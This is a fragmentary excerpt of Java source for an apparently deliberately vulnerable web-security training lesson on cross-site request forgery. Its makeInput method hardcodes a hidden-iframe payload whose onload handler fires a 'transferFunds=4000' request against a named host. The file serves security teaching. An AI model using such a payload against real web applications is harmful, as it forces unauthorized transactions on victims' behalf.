...
public class CSRF extends LessonAdapter
{
	...
	protected Element makeInput(WebSession s)
	{
		...
		Input inputTitle = new Input(Input.TEXT, TITLE, "CSRF- challenge token");
		...
		row2.addElement(item1);
                ...
                String messageText = "<iframe "
				+ "src=\"http://sglx481.amk.st.com:12080/GoodWebGoat/attack?Screen=2&menu=900&transferFunds=main\" "
				+ "id=\"myFrame\" frameborder=\"1\" marginwidth=\"0\" "
				+ "marginheight=\"0\" width=\"800\" scrolling=yes height=\"300\" "
				+ "onload=\"document.getElementById('frame2').src='http://sglx481.amk.st.com:12080/GoodWebGoat/attack?Screen=2&menu=900&transferFunds=4000';\"> "
				+ "</iframe> "
				+ "<iframe "
		...
		ec.addElement(new P().addElement(b));
                ec.addElement(new P().addElement(new IMG("images/ST/secure.jpg").setWidth(38).setHeight(20)));
